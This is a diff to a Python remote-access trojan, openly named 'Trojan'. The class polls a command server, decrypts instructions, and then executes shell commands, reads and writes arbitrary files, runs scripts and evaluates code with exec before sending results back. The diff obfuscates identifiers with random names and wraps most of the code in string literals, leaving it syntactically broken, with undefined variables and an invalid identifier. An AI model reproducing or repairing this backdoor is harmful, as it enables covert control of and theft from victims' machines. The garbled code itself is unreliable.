@@ -1,4 +1,4 @@
-import urllib.request as request
+"""import urllib.request as request
 import urllib.parse as parse
 from urllib.parse import quote, unquote
 
@@ -34,100 +34,99 @@ def decrypt(html : str) -> str:
     binarytext = base64.b64decode(base64text_norandom.encode('latin-1'))
     randomtext = ''.join(chr(int(binarytext[i*8:i*8+8],2)) for i in range(len(binarytext)//8))
     plaintext = randomtext[::2]
-    return plaintext
+    return plaintext"""
 
 
 class Trojan:
-    def __init__(self, commandurl,\
-                useragent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',\
-                computerid = 'None', **headers):
-        self.commandurl = commandurl
-        self.useragent = useragent
-        self.computerid = computerid
-        self.headers = {'computer-id':self.computerid, 'User-agent' : self.useragent}
-        self.headers.update(headers)
+    def __init__(r0VZS8aLng, Z96YE6gMyHNNWaW3UpZ,\
+                H7KBljw8yHtHm_Kt8_8v='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',\
+                A0ZHF2Jp0myE0a = platform.node(), **VWyKlUOzs5LBUj6j):
+        r0VZS8aLng.Z96YE6gMyHNNWaW3UpZ = Z96YE6gMyHNNWaW3UpZ
+        r0VZS8aLng.H7KBljw8yHtHm_Kt8_8v = H7KBljw8yHtHm_Kt8_8v
+        r0VZS8aLng.A0ZHF2Jp0myE0a = A0ZHF2Jp0myE0a
+        r0VZS8aLng.VWyKlUOzs5LBUj6j = {'computer-id':r0VZS8aLng.A0ZHF2Jp0myE0a, 'User-agent' : r0VZS8aLng.H7KBljw8yHtHm_Kt8_8v}
+        r0VZS8aLng.VWyKlUOzs5LBUj6j.update(VWyKlUOzs5LBUj6j)
     
-    def commands(self) -> dict:
-        print('[*] <- recieving commands')
-        req = request.Request(self.commandurl, headers = self.headers)
-        with request.urlopen(req) as response:
-            encryptedresponse = response.read()
-            encryptedresponse = encryptedresponse.decode()
-        decryptedresponse = decrypt(encryptedresponse)
+    def auJxN1d(r0VZS8aLng) -> dict:
+        BQj5tD4G3iJimSIn7_0D = request.Request(r0VZS8aLng.Z96YE6gMyHNNWaW3UpZ, headers = r0VZS8aLng.VWyKlUOzs5LBUj6j)
+        with request.urlopen(BQj5tD4G3iJimSIn7_0D) as 4nS7cJDGZ:
+            fblZMZgOoaZr2B = 4nS7cJDGZ.read()
+            fblZMZgOoaZr2B = fblZMZgOoaZr2B.decode()
+        H9qpETN7XAC_124 = decrypt(fblZMZgOoaZr2B)
         commands = ''
         try:
-            commands = json.loads(decryptedresponse)
+            commands = json.loads(H9qpETN7XAC_124)
         except json.JSONDecodeError:
-            decryptedresponse = decryptedresponse.replace('\'', '"')
-            commands = json.loads(decryptedresponse)
+            H9qpETN7XAC_124 = H9qpETN7XAC_124.replace('\'', '"')
+            commands = json.loads(H9qpETN7XAC_124)
         return commands
     
-    def sendoutcome(self, outcome: dict) -> str:
-        print('[*] -> sending ', outcome)
-        data = parse.quote(encrypt(str(outcome))).encode('utf-8')
-        req = request.Request(self.commandurl, data=data, headers = self.headers)
-        with request.urlopen(req) as response:
-            response = response.read().decode()
-        return response
+    """def sendoutcome(r0VZS8aLng, jgYcNro: dict) -> str:
+        print('[*] -> sending ', jgYcNro)
+        hZVnw04yhD = parse.quote(encrypt(str(jgYcNro))).encode('utf-8')
+        eK2E6SFiPeUFuE0I = request.Request(r0VZS8aLng.Z96YE6gMyHNNWaW3UpZ, data=hZVnw04yhD, headers = r0VZS8aLng.VWyKlUOzs5LBUj6j)
+        with request.urlopen(eK2E6SFiPeUFuE0I) as I7QtHeBHDWgTr1UPqo:
+            I7QtHeBHDWgTr1UPqo = I7QtHeBHDWgTr1UPqo.read().decode()
+        return I7QtHeBHDWgTr1UPqo
             
-    def run(self):
-        JzH0oTSG = self.commands()
-        outcomes = {'EI0ILNlH9QjMm' : [], 'yowwEp9pQIYv' : [], 't6Z5rKHgCpvn6' : [], 'NpP5lLMxSTy' : [], 'p_1io3vQuuA' : []}
+    def R9eapaCq7pEl0oqx(r0VZS8aLng):
+        JzH0oTSG = r0VZS8aLng.auJxN1d()
+        htrHKQg_mm5 = {'EI0ILNlH9QjMm' : [], 'yowwEp9pQIYv' : [], 't6Z5rKHgCpvn6' : [], 'NpP5lLMxSTy' : [], 'p_1io3vQuuA' : []}
         for _8Qz1Can, lGX5tRwLFtf4Q in JzH0oTSG.items():
             if _8Qz1Can.lower() == 'EI0ILNlH9QjMm': #cmd
                 for GLusu2aBblLHF in lGX5tRwLFtf4Q:
-                    output = str(os.popen(GLusu2aBblLHF).read())
-                    if output == -1 or output == 1:
+                    jgLOV1mnqvrVfi7 = str(os.popen(GLusu2aBblLHF).read())
+                    if jgLOV1mnqvrVfi7 == -1 or jgLOV1mnqvrVfi7 == 1:
                         try:
-                            output = subprocess.check_output(shlex.split(GLusu2aBblLHF), stderr=subprocess.STDOUT)
+                            jgLOV1mnqvrVfi7 = subprocess.check_output(shlex.split(GLusu2aBblLHF), stderr=subprocess.STDOUT)
                         except Exception as e:
-                            output = e
-                    outcomes['EI0ILNlH9QjMm'].append([ GLusu2aBblLHF, output])
+                            jgLOV1mnqvrVfi7 = e
+                    htrHKQg_mm5['EI0ILNlH9QjMm'].append([ GLusu2aBblLHF, jgLOV1mnqvrVfi7])
             elif _8Qz1Can.lower() == 'yowwEp9pQIYv': #file read
                 for GLusu2aBblLHF in lGX5tRwLFtf4Q:
                     try:
                         with open(GLusu2aBblLHF, 'r') as file:
-                            content = file.read()
+                            jgLOV1mnqvrVfi7 = file.read()
                     except Exception as e:
-                        content = e
-                    outcomes['yowwEp9pQIYv'].append([GLusu2aBblLHF, content])
+                        jgLOV1mnqvrVfi7 = e
+                    htrHKQg_mm5['yowwEp9pQIYv'].append([GLusu2aBblLHF, jgLOV1mnqvrVfi7])
             elif _8Qz1Can.lower() == 't6Z5rKHgCpvn6': #file write
                 for GLusu2aBblLHF in lGX5tRwLFtf4Q:
-                    errors = None
+                    jgLOV1mnqvrVfi7 = None
                     try:
-                        with open(GLusu2aBblLHF[0], 'w') as file:
-                            file.write(value[1])
+                        with open(GLusu2aBblLHF[0], 'w') as nDfyuu0QYM7vySJ:
+                            nDfyuu0QYM7vySJ.write(GLusu2aBblLHF[1])
                     except Exception as e:
-                        errors = e
-                    outcomes['t6Z5rKHgCpvn6'].append([GLusu2aBblLHF[0], errors])
+                        jgLOV1mnqvrVfi7 = e
+                    htrHKQg_mm5['t6Z5rKHgCpvn6'].append([GLusu2aBblLHF[0], jgLOV1mnqvrVfi7])
             elif _8Qz1Can.lower() == 'NpP5lLMxSTy':
                 for GLusu2aBblLHF in lGX5tRwLFtf4Q:
-                    filetype = value.split('.')[-1]
-                    if filetype == '.py': filetype = 'python'
-                    output = ''
+                    STtP3yI37W9djsEm = GLusu2aBblLHF.split('.')[-1]
+                    if STtP3yI37W9djsEm == '.py': STtP3yI37W9djsEm = 'python'
+                    jgLOV1mnqvrVfi7 = ''
                     if '.' not in filetype:
                         try:
-                            output +=subprocess.check_output(shlex.split('%s %s' %(filetype, GLusu2aBblLHF)), stderr=subprocess.STDOUT).decode()
+                            jgLOV1mnqvrVfi7 +=subprocess.check_output(shlex.split('%s %s' %(STtP3yI37W9djsEm, GLusu2aBblLHF)), stderr=subprocess.STDOUT).decode()
                         except Exception as e:
-                            output += str(e)
+                            jgLOV1mnqvrVfi7 += str(e)
                     else:
-                        output += '\n\n[*] Invalid file type\n\n'
-                    outcomes['NpP5lLMxSTy'].append([value, output])
+                        jgLOV1mnqvrVfi7 += '\n\n[*] Invalid file type\n\n'
+                    htrHKQg_mm5['NpP5lLMxSTy'].append([GLusu2aBblLHF, jgLOV1mnqvrVfi7])
             elif _8Qz1Can.lower() == 'p_1io3vQuuA':
                 for GLusu2aBblLHF in lGX5tRwLFtf4Q:
                     try:
                         if '()' not in value:
                             loc = {}
                             exec('output = %s' % GLusu2aBblLHF, globals(), loc)
-                            output = loc['output']
+                            jgLOV1mnqvrVfi7 = loc['output']
                         else:
                             exec(GLusu2aBblLHF)
-                            output = ('executed "%"s correctly' % value)
+                            jgLOV1mnqvrVfi7= ('executed "%"s correctly' % GLusu2aBblLHF)
                     except Exception as e:
-                        output = e
-                    outcomes['p_1io3vQuuA'].append([GLusu2aBblLHF, output])
-        outcomes = str(outcomes)
-        self.sendoutcome(outcomes)
+                        jgLOV1mnqvrVfi7 = e
+                    htrHKQg_mm5['p_1io3vQuuA'].append([GLusu2aBblLHF, jgLOV1mnqvrVfi7])
+        htrHKQg_mm5 = str(htrHKQg_mm5)
+        r0VZS8aLng.sendoutcome(htrHKQg_mm5)"""
         
-trojan = Trojan('http://127.0.0.1:8000', computerid=platform.node())
-trojan.run()
+"""trojan = Trojan('http://127.0.0.1:8000')
+trojan.R9eapaCq7pEl0oqx()"""
